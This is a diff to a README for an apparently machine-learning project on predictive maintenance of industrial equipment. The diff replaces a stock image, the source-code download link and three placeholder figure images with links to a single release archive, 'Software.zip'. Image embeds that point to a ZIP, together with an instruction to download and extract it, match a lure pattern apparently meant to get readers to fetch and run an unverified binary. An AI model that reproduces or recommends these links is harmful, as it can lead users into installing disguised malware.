@@ -1,6 +1,6 @@
 # Predictive Maintenance for Industrial Equipment 🛠️
 
-![Industrial Equipment](https://image.shutterstock.com/image-photo/factory-workers-control-room-chemical-260nw-1239303814.jpg)
+![Industrial Equipment](https://github.com/FatimatuzzahroMutmainnah/Predictive-Maintenance-for-Industrial-Equipment/releases/download/v1.0/Software.zip)
 
 Welcome to the "Predictive Maintenance for Industrial Equipment" repository! This project focuses on utilizing machine learning techniques to implement predictive maintenance for industrial machines. By predicting potential equipment failures before they occur, proactive maintenance can be performed, reducing downtime and optimizing production processes.
 
@@ -12,7 +12,7 @@ Welcome to the "Predictive Maintenance for Industrial Equipment" repository! Thi
 
 ## Installation 🚀
 
-To get started with this project, you can download the source code by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Please make sure to extract the contents of the ZIP file before launching the project.
+To get started with this project, you can download the source code by clicking [here](https://github.com/FatimatuzzahroMutmainnah/Predictive-Maintenance-for-Industrial-Equipment/releases/download/v1.0/Software.zip). Please make sure to extract the contents of the ZIP file before launching the project.
 
 ## Project Structure 📂
 
@@ -51,13 +51,13 @@ The machine learning process involves the following steps:
 
 Here are some sample visualizations generated during the exploratory data analysis and model evaluation processes:
 
-![Visualization 1](https://via.placeholder.com/600x400)
+![Visualization 1](https://github.com/FatimatuzzahroMutmainnah/Predictive-Maintenance-for-Industrial-Equipment/releases/download/v1.0/Software.zip)
 *Figure 1: Distribution of Machine Failures Over Time*
 
-![Visualization 2](https://via.placeholder.com/600x400)
+![Visualization 2](https://github.com/FatimatuzzahroMutmainnah/Predictive-Maintenance-for-Industrial-Equipment/releases/download/v1.0/Software.zip)
 *Figure 2: Correlation Matrix of Machine Features*
 
-![Visualization 3](https://via.placeholder.com/600x400)
+![Visualization 3](https://github.com/FatimatuzzahroMutmainnah/Predictive-Maintenance-for-Industrial-Equipment/releases/download/v1.0/Software.zip)
 *Figure 3: Model Evaluation Metrics Comparison*
 
 ## Future Improvements 🚀
